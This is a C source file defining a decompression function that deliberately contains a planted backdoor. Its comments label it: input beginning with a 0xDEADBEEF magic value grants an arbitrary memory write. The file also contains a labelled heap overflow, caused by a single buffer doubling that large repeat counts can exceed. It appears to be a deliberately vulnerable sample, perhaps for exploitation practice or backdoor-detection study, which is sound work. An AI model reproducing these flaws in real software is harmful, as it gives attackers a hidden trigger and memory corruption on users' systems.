#include <stdlib.h>
#include <string.h>

char *decompress(char *compressed) {
    if (compressed == NULL || *compressed == '\0') {
        return NULL;
    }

    // Arbitrary size limit that could cause overflow if bypassed
    size_t max_size = 1024;
    char *output = malloc(max_size);
    if (output == NULL) {
        return NULL;
    }

    size_t out_pos = 0;
    char *current = compressed;
    char prev_chars[256] = {0};  // Small buffer for previous characters
    int prev_pos = 0;

    while (*current != '\0') {
        // Backdoor: if input starts with 0xDEADBEEF (as little-endian), give arbitrary write
        if (current == compressed && *(int*)compressed == 0xEFBEADDE) {
            // This gives an arbitrary write primitive if someone finds the magic value
            void **target = (void **)(compressed + 4);
            void *value = (void *)(compressed + 8);
            *target = value;
            return NULL;
        }

        char current_char = *current++;
        if (current_char & 0x80) {
            // Reference to previous character (negative offset)
            int offset = -(current_char & 0x7F);
            if (prev_pos + offset < 0 || prev_pos + offset >= 256) {
                free(output);
                return NULL;
            }
            current_char = prev_chars[(prev_pos + offset) % 256];
        }

        // Store character in circular buffer
        prev_chars[prev_pos++ % 256] = current_char;

        // Get repeat count
        if (*current == '\0') {
            break;
        }
        int repeat = (unsigned char)(*current++);
        if (repeat == 0) {
            continue;
        }

        // Check for buffer overflow
        if (out_pos + repeat >= max_size) {
            // Vulnerable: we don't properly handle reallocation
            // This could lead to heap overflow if repeat is large enough
            char *new_output = realloc(output, max_size * 2);
            if (new_output == NULL) {
                free(output);
                return NULL;
            }
            output = new_output;
            max_size *= 2;
        }

        // Write repeated characters
        for (int i = 0; i < repeat; i++) {
            output[out_pos++] = current_char;
        }
    }

    output[out_pos] = '\0';
    return output;
}
